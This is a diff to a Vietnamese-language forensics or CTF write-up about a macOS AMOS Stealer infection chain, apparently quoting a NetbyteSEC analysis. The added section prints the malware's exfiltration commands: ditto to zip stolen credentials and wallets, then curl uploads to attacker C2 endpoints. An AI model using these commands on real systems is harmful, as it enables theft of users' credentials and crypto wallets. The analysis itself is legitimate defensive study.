@@ -238,7 +238,27 @@ Không trả về gì cả nên source process pid lớn nhất là: **87990**
 
 **12. Trong chính bài phân tích của NetbyteSEC đó, tên viết tắt của malware family được tác giả xác định cho smodule là gì? — Format: FAMILY**
 
-AMOS Stealer: là dropper malware InfoStealer dùng để thu thập toàn bộ các data về web browsing, keychain password, folder và file trong desktop, documents, download, hơn nữa nó còn target vào credentials browser data, và cả cryptography currencies wallet.
+Tới đây attacker bắt đầu thực hiện dropper malware xuống hệ thống của máy victim, 
+
+**AMOS Stealer**: là dropper malware InfoStealer dùng để thu thập toàn bộ các data về web browsing, keychain password, folder và file trong desktop, documents, download, hơn nữa nó còn target vào credentials browser data, và cả cryptography currencies wallet. Bên trong chain attack này nó thực hiện thu thập Desktop Wallet, Browser Data bao gồm firefox và Chrome, MacOS keychain, browser Safe Storage key, các file trong `~/Desktop, Documents`. Đồng thời nó cũng được sử dụng làm 1 method exfiltration data:
+
+<img width="1040" height="242" alt="image" src="https://github.com/user-attachments/assets/154849a5-4f97-4433-b148-08cc78c8c81b" />
+
+> Command `ditto` trong macOS là 1 lệnh legitmate có thể được lợi dụng để nén các file và folder thành file zip để dùng trong quá trình exfiltration data. 
+
+**Light Stealer:** là version nhẹ hơn và ít tính năng hơn AMOS Stealer, được sử dụng khi người vận hành ưu tiên tốc độ và khả năng tàng hình hơn là thu thập dữ liệu toàn diện.
+
+**ledger + xmr - the XMRig cryptominer:** là một phần mềm mã nguồn mở dùng để khai thác các tiền điện thử như Monero.
+
+Stage cuối cùng là thực hiện exfiltration data, đầu tiên là các file credentials đã được nén lại trong stage4 ở con infostealer AMOS bằng lệnh `ditto`, sau đó sử dụng command curl để đẩy toàn bộ các file zip lên server C2 của attacker:
+
+```
+ditto -c -k --sequesterRsrc <lootdir> /tmp/<hash>.zip
+# if the zip is > 90 MB:
+curl -F 'txid=427e8b573407f6029923cdb4686b5f77' -F 'file=@/tmp/<hash>.zip' <http://62.60.226.0/upload.php>
+# else:
+curl -F 'txid=427e8b573407f6029923cdb4686b5f77' -F 'file=@/tmp/<hash>.zip' <https://hf98x4d.site/upload.php> # fallback → bare IP
+```
 
 **13. Địa chỉ Polygon operator wallet được bài phân tích của NetbyteSEC liệt kê là gì? — Format: 0x0123456789abcdef0123456789abcdef01234567**
 
